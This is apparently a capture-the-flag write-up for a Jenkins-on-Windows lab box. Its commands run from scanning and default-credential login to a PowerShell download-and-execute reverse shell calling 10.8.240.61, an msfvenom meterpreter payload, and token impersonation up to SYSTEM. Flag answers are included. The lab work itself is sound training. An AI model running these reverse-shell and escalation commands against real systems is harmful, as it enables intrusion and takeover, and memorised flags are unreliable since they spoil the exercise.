### [nmap.init.out](./nmap.init.out)
### [shell.exe.zip](./shell.exe.zip)
### [Invoke-PowerShellTcp.ps1](./Invoke-PowerShellTcp.ps1)

## task 1

```
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
3389/tcp open  ssl/ms-wbt-server?
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

> How many ports are open? (TCP only)
3

> What is the username and password for the log in panel(in the format username:password)
admin:admin

just try a few common ones


> What is the user.txt flag?
79007a09481963edf2e1321abd9ae2a0

- get shell
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.240.61:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.240.61 -Port 8889
```
put in config tab, command box

- alfred secret
```
PS C:\Program Files (x86)\Jenkins> type secret.key
cb2ae36e1862a23b3adfd393282eae76f896f2efb0a4da79643e33afc616751e
```

- user flag
PS C:\Users\bruce> type Desktop/user.txt
79007a09481963edf2e1321abd9ae2a0


## task 2

- making payload
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.240.61 LPORT=8989 -f exe -o revshell.exe
```

- transfer payload
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.240.61:8000/revshell.exe','revshell.exe')" // jenkins
```

- reverse shell listener
`use exploit/multi/handler`

- once uploaded, in the privous shell run
```
Start-Process "revshell.exe"
```
## task 3

### use token impersonation

```
Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

    user SIDs(security identifier)
    group SIDs
    privileges

amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:

    primary access tokens: those associated with a user account that are generated on log on
    impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

    SecurityAnonymous: current user/client cannot impersonate another user/client
    SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
    SecurityImpersonation: current user/client can impersonate the client's security context on the local system
    SecurityDelegation: current user/client can impersonate the client's security context on a remote system

where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

    SeImpersonatePrivilege
    SeAssignPrimaryPrivilege
    SeTcbPrivilege
    SeBackupPrivilege
    SeRestorePrivilege
    SeCreateTokenPrivilege
    SeLoadDriverPrivilege
    SeTakeOwnershipPrivilege
    SeDebugPrivilege

There's more reading [here](https://www.exploit-db.com/papers/42556).
```

## check priv
```
C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               Sta>
=============================== ========================================= ===>
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Dis>
SeSecurityPrivilege             Manage auditing and security log          Dis>
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Dis>
SeLoadDriverPrivilege           Load and unload device drivers            Dis>
SeSystemProfilePrivilege        Profile system performance                Dis>
SeSystemtimePrivilege           Change the system time                    Dis>
SeProfileSingleProcessPrivilege Profile single process                    Dis>
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Dis>
SeCreatePagefilePrivilege       Create a pagefile                         Dis>
SeBackupPrivilege               Back up files and directories             Dis>
SeRestorePrivilege              Restore files and directories             Dis>
SeShutdownPrivilege             Shut down the system                      Dis>
SeDebugPrivilege                Debug programs                            Ena>	<==
SeSystemEnvironmentPrivilege    Modify firmware environment values        Dis>
SeChangeNotifyPrivilege         Bypass traverse checking                  Ena>
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Dis>
SeUndockPrivilege               Remove computer from docking station      Dis>
SeManageVolumePrivilege         Perform volume maintenance tasks          Dis>
SeImpersonatePrivilege          Impersonate a client after authentication Ena>	<==
SeCreateGlobalPrivilege         Create global objects                     Ena>
SeIncreaseWorkingSetPrivilege   Increase a process working set            Dis>
SeTimeZonePrivilege             Change the time zone                      Dis>
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Dis>
```

- Enter: `load incognito` to load the incognito module in metasploit.
- run `list_tokens -g` to see all tokens available

```
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc

```

## use impersonate token
```
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

```
Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS
```
##  read the root.txt file at C:\Windows\System32\config
```
dff0f748678f280250f25a45b8046b4a
```